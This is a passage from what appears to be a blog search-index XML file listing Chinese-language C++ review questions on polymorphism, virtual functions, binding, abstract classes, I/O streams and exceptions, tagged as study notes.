id="多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？"><a href="#多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？" class="headerlink" title="多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？"></a>多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？</h4><hr><h3 id="六、多态性和虚函数"><a href="#六、多态性和虚函数" class="headerlink" title="六、多态性和虚函数"></a><font color="DarkViolet"><center>六、多态性和虚函数</center></font></h3><hr><h4 id="什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？"><a href="#什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？" class="headerlink" title="什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？"></a>什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？</h4><hr><h4 id="如何实现多态性？"><a href="#如何实现多态性？" class="headerlink" title="如何实现多态性？"></a>如何实现多态性？</h4><hr><h4 id="虚函数是如何实现的（考试不会考）？"><a href="#虚函数是如何实现的（考试不会考）？" class="headerlink" title="虚函数是如何实现的（考试不会考）？"></a>虚函数是如何实现的（考试不会考）？</h4><hr><h4 id="动态-静态绑定（binding、联编）的优缺点各是什么？"><a href="#动态-静态绑定（binding、联编）的优缺点各是什么？" class="headerlink" title="动态/静态绑定（binding、联编）的优缺点各是什么？"></a>动态/静态绑定（binding、联编）的优缺点各是什么？</h4><hr><h4 id="什么是纯虚函数？什么是抽象类？其意义各自是什么？"><a href="#什么是纯虚函数？什么是抽象类？其意义各自是什么？" class="headerlink" title="什么是纯虚函数？什么是抽象类？其意义各自是什么？"></a>什么是纯虚函数？什么是抽象类？其意义各自是什么？</h4><hr><h3 id="七、输入输出流"><a href="#七、输入输出流" class="headerlink" title="七、输入输出流"></a><font color="DarkViolet"><center>七、输入输出流</center></font></h3><hr><h4 id="C-I-O的优势在哪（和前面第一章的类似）？"><a href="#C-I-O的优势在哪（和前面第一章的类似）？" class="headerlink" title="C++I/O的优势在哪（和前面第一章的类似）？"></a>C++I/O的优势在哪（和前面第一章的类似）？</h4><hr><h4 id="标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？"><a href="#标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？" class="headerlink" title="标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？"></a>标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？</h4><hr><h4 id="如何使用文件流进行输入-输出（步骤）？"><a href="#如何使用文件流进行输入-输出（步骤）？" class="headerlink" title="如何使用文件流进行输入/输出（步骤）？"></a>如何使用文件流进行输入/输出（步骤）？</h4><hr><h4 id="什么是字符串流？它有什么用好处？"><a href="#什么是字符串流？它有什么用好处？" class="headerlink" title="什么是字符串流？它有什么用好处？"></a>什么是字符串流？它有什么用好处？</h4><hr><h3 id="八、C-工具"><a href="#八、C-工具" class="headerlink" title="八、C++工具"></a><font color="DarkViolet"><center>八、C++工具</center></font></h3><hr><h4 id="实现异常的三个关键字是什么？大致的作用是什么？"><a href="#实现异常的三个关键字是什么？大致的作用是什么？" class="headerlink" title="实现异常的三个关键字是什么？大致的作用是什么？"></a>实现异常的三个关键字是什么？大致的作用是什么？</h4><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
